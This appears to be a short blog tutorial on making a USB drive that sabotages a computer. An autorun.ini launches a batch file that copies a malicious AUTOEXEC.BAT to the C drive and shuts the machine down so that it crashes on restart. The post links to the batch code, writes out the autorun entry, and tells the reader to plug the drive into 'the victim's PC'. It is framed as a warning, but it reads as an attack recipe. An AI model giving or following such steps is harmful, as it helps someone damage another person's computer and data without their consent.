## In this post, we will demonstrate this vulnerability with an example, so that you can beware of the evil "joke" that may be slipped to you.

### How it works ?

`You insert the USB flash drive, the autorun.ini file automatically opens Dead.BAT, Dead.BAT copies AUTOEXEC.BAT to the C drive and turns off the computer.  When you restart it, the system crashes.`

* 1) Create an AUTOEXEC text document and paste the following code from the link into it:
 https://github.com/muneebwanee/Tutorials/blob/main/code1.txt
 └After click "Save As" and enter the name of the file with the extension .BAT
* 2) Create a Dead text document and paste the following code from the link into it:
 https://github.com/muneebwanee/Tutorials/blob/main/code2.txt
 └After click "Save As" and enter the name of the file with the extension .BAT
* 3) Create a text document called autorun and write the following commands in it:
 [autorun]
 OPEN = Dead.BAT
 └After save it with .ini extension

 * Now you can insert the USB stick into the victim's PC.  Perhaps the antivirus will prevent these files from working.

### Thank you all for your attention!

### * This Article was written by : muneebwanee (https://muneb.rf.gd)
